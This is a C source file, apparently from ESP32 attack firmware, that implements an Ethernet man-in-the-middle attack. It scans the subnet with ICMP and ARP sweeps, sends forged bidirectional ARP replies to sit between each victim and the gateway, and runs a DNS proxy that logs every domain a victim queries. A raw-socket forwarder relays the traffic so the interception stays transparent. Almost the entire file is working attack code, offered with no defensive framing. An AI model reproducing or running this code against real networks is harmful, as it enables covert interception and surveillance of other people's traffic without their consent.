// eth_arp_poison.c
// ARP poisoning + DNS proxy attack over Ethernet (W5500).
// - Bidirectional ARP poisoning (victim<->gateway)
// - ICMP ping sweep + ARP scan for host discovery
// - Passive host discovery (learns new hosts at runtime)
// - DNS proxy using network's actual DNS server
// - IP packet forwarding for transparent MITM
// - Logs all queried domains

#include "sdkconfig.h"

#ifdef CONFIG_WITH_ETHERNET

#include "attacks/ethernet/eth_arp_poison.h"
#include "managers/ethernet_manager.h"
#include "core/glog.h"
#include "esp_netif.h"
#include "lwip/netif.h"
#include "lwip/etharp.h"
#include "lwip/ip4_addr.h"
#include "lwip/icmp.h"
#include "lwip/ip.h"
#include "lwip/inet_chksum.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>

// Forward declaration (not in public API but available internally)
void *esp_netif_get_netif_impl(esp_netif_t *esp_netif);

#define MAX_HOSTS      64
#define MAX_DOMAINS   100
#define MAX_DOMAIN_LEN 64

typedef struct {
    ip4_addr_t ip;
    uint8_t    mac[6];
} eth_host_t;

static eth_host_t s_hosts[MAX_HOSTS];
static int        s_host_count   = 0;
static uint8_t    s_our_mac[6];
static ip4_addr_t s_gateway_ip;
static uint8_t    s_gateway_mac[6];
static ip4_addr_t s_dns_server;
static SemaphoreHandle_t s_hosts_mutex = NULL;

static char s_domains[MAX_DOMAINS][MAX_DOMAIN_LEN];
static int  s_domain_count = 0;

static volatile bool s_running     = false;
static TaskHandle_t  s_poison_task = NULL;
static TaskHandle_t  s_dns_task    = NULL;
static TaskHandle_t  s_fwd_task    = NULL;
static TaskHandle_t  s_passive_task = NULL;

static ip4_addr_t s_our_ip;
static struct netif *s_lwip_netif = NULL;

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

// Construct and transmit a 42-byte ARP REPLY frame.
// Claims sender_ip is reachable at sender_mac.
static void send_arp_reply(const uint8_t *dst_mac,
                           const uint8_t *sender_mac, const ip4_addr_t *sender_ip,
                           const uint8_t *target_mac, const ip4_addr_t *target_ip)
{
    uint8_t frame[42];

    // Ethernet header
    memcpy(frame + 0, dst_mac,    6);
    memcpy(frame + 6, sender_mac, 6);
    frame[12] = 0x08; frame[13] = 0x06;  // EtherType: ARP

    // ARP payload
    frame[14] = 0x00; frame[15] = 0x01;  // Hardware type: Ethernet
    frame[16] = 0x08; frame[17] = 0x00;  // Protocol type: IPv4
    frame[18] = 0x06;                    // Hardware address length
    frame[19] = 0x04;                    // Protocol address length
    frame[20] = 0x00; frame[21] = 0x02;  // Opcode: REPLY

    memcpy(frame + 22, sender_mac,      6);  // Sender MAC
    memcpy(frame + 28, &sender_ip->addr, 4); // Sender IP (network byte order)
    memcpy(frame + 32, target_mac,      6);  // Target MAC
    memcpy(frame + 38, &target_ip->addr, 4); // Target IP (network byte order)

    ethernet_manager_transmit_raw(frame, sizeof(frame));
}

// Extract domain name from a raw DNS query buffer.
// DNS question section starts at byte 12 after the 12-byte header.
// Label format: [len][chars]...[0x00]
static void extract_dns_domain(const uint8_t *buf, int len,
                                char *out, int out_len)
{
    out[0] = '\0';
    if (len < 13) return;

    const uint8_t *p   = buf + 12;
    const uint8_t *end = buf + len;
    int  out_pos = 0;
    bool first   = true;

    while (p < end) {
        uint8_t label_len = *p++;
        if (label_len == 0)     break;  // Root / end
        if (label_len >= 0xC0)  break;  // Pointer (DNS compression)
        if (p + label_len > end) break; // Truncated

        if (!first && out_pos < out_len - 1)
            out[out_pos++] = '.';
        first = false;

        int copy = label_len;
        if (out_pos + copy >= out_len)
            copy = out_len - out_pos - 1;
        memcpy(out + out_pos, p, copy);
        out_pos += copy;
        p       += label_len;
    }
    out[out_pos] = '\0';
}

// Log domain (dedup); always print to console.
static void log_domain(const char *domain, const char *src_ip)
{
    if (domain[0] == '\0') return;

    for (int i = 0; i < s_domain_count; i++) {
        if (strcmp(s_domains[i], domain) == 0) {
            glog("[DNS] %s -> %s\n", src_ip, domain);
            return;
        }
    }
    if (s_domain_count < MAX_DOMAINS) {
        strncpy(s_domains[s_domain_count], domain, MAX_DOMAIN_LEN - 1);
        s_domains[s_domain_count][MAX_DOMAIN_LEN - 1] = '\0';
        s_domain_count++;
    }
    glog("[DNS] %s -> %s\n", src_ip, domain);
}

static bool add_host_if_new(const ip4_addr_t *ip, const uint8_t *mac)
{
    if (ip->addr == s_our_ip.addr) return false;
    if (ip->addr == s_gateway_ip.addr) return false;

    if (xSemaphoreTake(s_hosts_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;

    for (int i = 0; i < s_host_count; i++) {
        if (s_hosts[i].ip.addr == ip->addr) {
            xSemaphoreGive(s_hosts_mutex);
            return false;
        }
    }

    if (s_host_count >= MAX_HOSTS) {
        xSemaphoreGive(s_hosts_mutex);
        return false;
    }

    ip4_addr_copy(s_hosts[s_host_count].ip, *ip);
    memcpy(s_hosts[s_host_count].mac, mac, 6);
    s_host_count++;

    char ip_str[16];
    ip4addr_ntoa_r(ip, ip_str, sizeof(ip_str));
    glog("[ARP Poison] New host discovered: %s [%02x:%02x:%02x:%02x:%02x:%02x]\n",
         ip_str, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    xSemaphoreGive(s_hosts_mutex);
    return true;
}

static void send_icmp_ping(const ip4_addr_t *target)
{
    int sock = socket(AF_INET, SOCK_RAW, IP_PROTO_ICMP);
    if (sock < 0) return;

    struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct icmp_echo_hdr *icmp;
    uint8_t pkt[64];
    memset(pkt, 0, sizeof(pkt));
    icmp = (struct icmp_echo_hdr *)pkt;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->chksum = 0;
    icmp->id = htons(0xDEAD);
    icmp->seqno = htons(1);
    icmp->chksum = inet_chksum(icmp, sizeof(pkt));

    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = target->addr,
    };
    sendto(sock, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
    close(sock);
}

static void icmp_sweep(const char *subnet_prefix)
{
    glog("[ARP Poison] ICMP ping sweep %s0/24...\n", subnet_prefix);

    for (int h = 1; h <= 254; h++) {
        if (!s_running) break;
        if (h % 10 == 0) vTaskDelay(pdMS_TO_TICKS(10));

        char target_str[20];
        snprintf(target_str, sizeof(target_str), "%s%d", subnet_prefix, h);
        ip4_addr_t target;
        if (!ip4addr_aton(target_str, &target)) continue;
        if (target.addr == s_our_ip.addr) continue;
        if (target.addr == s_gateway_ip.addr) continue;
        send_icmp_ping(&target);
    }
    vTaskDelay(pdMS_TO_TICKS(200));
}

// ---------------------------------------------------------------------------
// FreeRTOS tasks
// ---------------------------------------------------------------------------

static void arp_poison_task(void *arg)
{
    while (s_running) {
        for (int i = 0; i < s_host_count && s_running; i++) {
            if (s_hosts[i].ip.addr == s_gateway_ip.addr) continue;
            send_arp_reply(s_hosts[i].mac,
                           s_our_mac, &s_gateway_ip,
                           s_hosts[i].mac, &s_hosts[i].ip);
            bool have_gw_mac = s_gateway_mac[0] || s_gateway_mac[1] || s_gateway_mac[2];
            if (have_gw_mac) {
                send_arp_reply(s_gateway_mac,
                               s_our_mac, &s_hosts[i].ip,
                               s_gateway_mac, &s_gateway_ip);
            }
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        for (int t = 0; t < 20 && s_running; t++)
            vTaskDelay(pdMS_TO_TICKS(100));
    }
    s_poison_task = NULL;
    vTaskDelete(NULL);
}

// DNS proxy: recv query → extract domain → forward to 8.8.8.8 → relay answer.
static void dns_proxy_task(void *arg)
{
    uint8_t buf[512];
    uint8_t resp[512];

    // Listen socket on port 53
    int lsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (lsock < 0) {
        glog("[ARP Poison] DNS socket failed: %d\n", errno);
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    int reuse = 1;
    setsockopt(lsock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    struct sockaddr_in laddr = {
        .sin_family      = AF_INET,
        .sin_port        = htons(53),
        .sin_addr.s_addr = INADDR_ANY,
    };
    if (bind(lsock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
        glog("[ARP Poison] DNS bind failed: %d\n", errno);
        close(lsock);
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv_listen = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(lsock, SOL_SOCKET, SO_RCVTIMEO, &tv_listen, sizeof(tv_listen));

    int fsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in faddr = {
        .sin_family      = AF_INET,
        .sin_port        = htons(53),
        .sin_addr.s_addr = s_dns_server.addr,
    };
    struct timeval tv_fwd = { .tv_sec = 3, .tv_usec = 0 };
    setsockopt(fsock, SOL_SOCKET, SO_RCVTIMEO, &tv_fwd, sizeof(tv_fwd));

    char dns_str[16];
    ip4addr_ntoa_r(&s_dns_server, dns_str, sizeof(dns_str));
    glog("[ARP Poison] DNS proxy active on port 53 -> %s\n", dns_str);

    while (s_running) {
        struct sockaddr_in client;
        socklen_t clen = sizeof(client);

        int len = recvfrom(lsock, buf, sizeof(buf), 0,
                           (struct sockaddr *)&client, &clen);
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            if (!s_running) break;
            continue;
        }

        char domain[MAX_DOMAIN_LEN];
        extract_dns_domain(buf, len, domain, sizeof(domain));

        char src_ip[16];
        inet_ntop(AF_INET, &client.sin_addr, src_ip, sizeof(src_ip));
        log_domain(domain, src_ip);

        // Forward to 8.8.8.8
        int sent = sendto(fsock, buf, len, 0,
                          (struct sockaddr *)&faddr, sizeof(faddr));
        if (sent < 0) continue;

        // Get real answer and relay back
        int rlen = recv(fsock, resp, sizeof(resp), 0);
        if (rlen > 0)
            sendto(lsock, resp, rlen, 0, (struct sockaddr *)&client, clen);
    }

    close(fsock);
    close(lsock);
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

#define FWD_BUF_SIZE 256
static void packet_forwarder_task(void *arg)
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        glog("[ARP Poison] Raw socket failed: %d\n", errno);
        s_fwd_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv = { .tv_sec = 0, .tv_usec = 500000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t *buf = malloc(FWD_BUF_SIZE);
    if (!buf) {
        glog("[ARP Poison] Forwarder OOM\n");
        close(sock);
        s_fwd_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    glog("[ARP Poison] Packet forwarder active\n");

    while (s_running) {
        struct sockaddr_in src;
        socklen_t slen = sizeof(src);
        int len = recvfrom(sock, buf, FWD_BUF_SIZE, 0, (struct sockaddr *)&src, &slen);
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            if (!s_running) break;
            continue;
        }
        if (len < 20) continue;

        uint32_t dst_ip;
        memcpy(&dst_ip, buf + 16, 4);

        if (dst_ip == s_our_ip.addr) continue;
        if (dst_ip == s_gateway_ip.addr) continue;

        for (int i = 0; i < s_host_count; i++) {
            if (s_hosts[i].ip.addr == dst_ip) {
                struct sockaddr_in dst = {
                    .sin_family = AF_INET,
                    .sin_port = 0,
                    .sin_addr.s_addr = dst_ip,
                };
                sendto(sock, buf, len, 0, (struct sockaddr *)&dst, sizeof(dst));
                break;
            }
        }
    }

    free(buf);
    close(sock);
    s_fwd_task = NULL;
    vTaskDelete(NULL);
}

static void passive_discovery_task(void *arg)
{
    int sock = socket(AF_INET, SOCK_RAW, IP_PROTO_ICMP);
    if (sock < 0) {
        glog("[ARP Poison] Passive discovery socket failed: %d\n", errno);
        s_passive_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    glog("[ARP Poison] Passive discovery active\n");

    while (s_running) {
        struct sockaddr_in src;
        socklen_t slen = sizeof(src);
        uint8_t buf[128];

        int len = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&src, &slen);
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            if (!s_running) break;
            continue;
        }

        ip4_addr_t src_ip;
        src_ip.addr = src.sin_addr.s_addr;
        if (src_ip.addr == s_our_ip.addr) continue;

        if (s_lwip_netif) {
            struct eth_addr *eth_ret = NULL;
            const ip4_addr_t *ip_ret = NULL;
            s8_t idx = etharp_find_addr(s_lwip_netif, &src_ip, &eth_ret, &ip_ret);
            if (idx >= 0 && eth_ret) {
                add_host_if_new(&src_ip, eth_ret->addr);
            }
        }
    }

    close(sock);
    s_passive_task = NULL;
    vTaskDelete(NULL);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

esp_err_t eth_arp_poison_start(void)
{
    if (s_running) {
        glog("[ARP Poison] Already running\n");
        return ESP_ERR_INVALID_STATE;
    }
    if (!ethernet_manager_is_connected()) {
        glog("[ARP Poison] Ethernet not connected\n");
        return ESP_ERR_INVALID_STATE;
    }

    esp_netif_ip_info_t ip_info;
    if (ethernet_manager_get_ip_info(&ip_info) != ESP_OK || ip_info.ip.addr == 0) {
        glog("[ARP Poison] No IP address\n");
        return ESP_ERR_INVALID_STATE;
    }

    esp_netif_t *eth_netif = ethernet_manager_get_netif();
    struct netif *lwip_netif = (struct netif *)esp_netif_get_netif_impl(eth_netif);
    if (!lwip_netif) {
        glog("[ARP Poison] Failed to get lwIP netif\n");
        return ESP_ERR_INVALID_STATE;
    }

    // Snapshot identity
    esp_netif_get_mac(eth_netif, s_our_mac);
    ip4_addr_copy(s_our_ip, ip_info.ip);
    ip4_addr_copy(s_gateway_ip, ip_info.gw);
    memset(s_gateway_mac, 0, sizeof(s_gateway_mac));
    s_lwip_netif = lwip_netif;

    esp_netif_dns_info_t dns_info;
    if (esp_netif_get_dns_info(eth_netif, ESP_NETIF_DNS_MAIN, &dns_info) == ESP_OK &&
        dns_info.ip.type == ESP_IPADDR_TYPE_V4) {
        ip4_addr_copy(s_dns_server, dns_info.ip.u_addr.ip4);
    } else {
        s_dns_server.addr = s_gateway_ip.addr;
    }

    if (s_hosts_mutex) vSemaphoreDelete(s_hosts_mutex);
    s_hosts_mutex = xSemaphoreCreateMutex();
    if (!s_hosts_mutex) {
        glog("[ARP Poison] Failed to create mutex\n");
        return ESP_ERR_NO_MEM;
    }

#if LWIP_IP_FORWARD
    netif_set_flags(lwip_netif, NETIF_FLAG_FORWARDING);
    glog("[ARP Poison] IP forwarding enabled\n");
#endif

    char our_ip_str[16], gw_str[16], dns_str[16];
    ip4addr_ntoa_r(&ip_info.ip, our_ip_str, sizeof(our_ip_str));
    ip4addr_ntoa_r(&s_gateway_ip, gw_str, sizeof(gw_str));
    ip4addr_ntoa_r(&s_dns_server, dns_str, sizeof(dns_str));
    glog("[ARP Poison] Our IP: %s  Gateway: %s  DNS: %s\n", our_ip_str, gw_str, dns_str);

    s_host_count   = 0;
    s_domain_count = 0;
    memset(s_domains, 0, sizeof(s_domains));

    uint32_t network = ip_info.ip.addr & ip_info.netmask.addr;
    char subnet_prefix[16];
    snprintf(subnet_prefix, sizeof(subnet_prefix), "%d.%d.%d.",
             (int)((network >> 0)  & 0xFF),
             (int)((network >> 8)  & 0xFF),
             (int)((network >> 16) & 0xFF));

    icmp_sweep(subnet_prefix);

    glog("[ARP Poison] ARP scanning %s0/24 ...\n", subnet_prefix);

    s_running = true;

    for (int h = 1; h <= 254; h++) {
        if (!s_running) break;
        char target_str[20];
        snprintf(target_str, sizeof(target_str), "%s%d", subnet_prefix, h);
        ip4_addr_t target_addr;
        if (ip4addr_aton(target_str, &target_addr)) {
            if (target_addr.addr == ip_info.ip.addr) continue;
            etharp_request(lwip_netif, &target_addr);
        }
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    vTaskDelay(pdMS_TO_TICKS(500));

    // Harvest ARP table
    for (int h = 1; h <= 254 && s_host_count < MAX_HOSTS; h++) {
        char target_str[20];
        snprintf(target_str, sizeof(target_str), "%s%d", subnet_prefix, h);
        ip4_addr_t target_addr;
        if (!ip4addr_aton(target_str, &target_addr)) continue;
        if (target_addr.addr == ip_info.ip.addr)     continue;

        struct eth_addr      *eth_ret = NULL;
        const ip4_addr_t     *ip_ret  = NULL;
        s8_t idx = etharp_find_addr(lwip_netif, &target_addr, &eth_ret, &ip_ret);
        if (idx >= 0 && eth_ret) {
            ip4_addr_copy(s_hosts[s_host_count].ip, target_addr);
            memcpy(s_hosts[s_host_count].mac, eth_ret->addr, 6);
            if (target_addr.addr == s_gateway_ip.addr)
                memcpy(s_gateway_mac, eth_ret->addr, 6);
            s_host_count++;
        }
    }

    glog("[ARP Poison] Found %d hosts\n", s_host_count);

    xTaskCreate(arp_poison_task, "arp_poison", 2048, NULL, 5, &s_poison_task);
    xTaskCreate(dns_proxy_task,  "dns_proxy",  4096, NULL, 6, &s_dns_task);
    xTaskCreate(packet_forwarder_task, "pkt_fwd", 3072, NULL, 5, &s_fwd_task);
    xTaskCreate(passive_discovery_task, "passive", 3072, NULL, 4, &s_passive_task);

    glog("[ARP Poison] Running — poisoning %d hosts, passive discovery active\n", s_host_count);
    return ESP_OK;
}

esp_err_t eth_arp_poison_stop(void)
{
    if (!s_running) {
        glog("[ARP Poison] Not running\n");
        return ESP_OK;
    }

    s_running = false;

    for (int i = 0; i < 30 && (s_poison_task || s_dns_task || s_fwd_task || s_passive_task); i++)
        vTaskDelay(pdMS_TO_TICKS(100));

    if (s_poison_task)   { vTaskDelete(s_poison_task);   s_poison_task   = NULL; }
    if (s_dns_task)      { vTaskDelete(s_dns_task);      s_dns_task      = NULL; }
    if (s_fwd_task)      { vTaskDelete(s_fwd_task);      s_fwd_task      = NULL; }
    if (s_passive_task)  { vTaskDelete(s_passive_task);  s_passive_task  = NULL; }

    if (s_hosts_mutex) {
        vSemaphoreDelete(s_hosts_mutex);
        s_hosts_mutex = NULL;
    }

    bool have_gw_mac = s_gateway_mac[0] || s_gateway_mac[1] || s_gateway_mac[2]
                    || s_gateway_mac[3] || s_gateway_mac[4] || s_gateway_mac[5];
    if (have_gw_mac) {
        glog("[ARP Poison] Restoring ARP tables...\n");
        for (int i = 0; i < s_host_count; i++) {
            if (s_hosts[i].ip.addr == s_gateway_ip.addr) continue;
            send_arp_reply(s_hosts[i].mac,
                           s_gateway_mac, &s_gateway_ip,
                           s_hosts[i].mac, &s_hosts[i].ip);
            send_arp_reply(s_gateway_mac,
                           s_hosts[i].mac, &s_hosts[i].ip,
                           s_gateway_mac, &s_gateway_ip);
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    glog("[ARP Poison] Stopped. %d domains captured.\n", s_domain_count);
    return ESP_OK;
}

bool eth_arp_poison_is_running(void)
{
    return s_running;
}

void eth_arp_poison_print_domains(void)
{
    if (s_domain_count == 0) {
        glog("[ARP Poison] No domains captured yet\n");
        return;
    }
    glog("[ARP Poison] Captured domains (%d):\n", s_domain_count);
    for (int i = 0; i < s_domain_count; i++)
        glog("  %d. %s\n", i + 1, s_domains[i]);
}

void eth_arp_poison_print_status(void)
{
    glog("[ARP Poison] State: %s | Hosts: %d | Domains: %d\n",
         s_running ? "running" : "stopped", s_host_count, s_domain_count);
}

#endif // CONFIG_WITH_ETHERNET
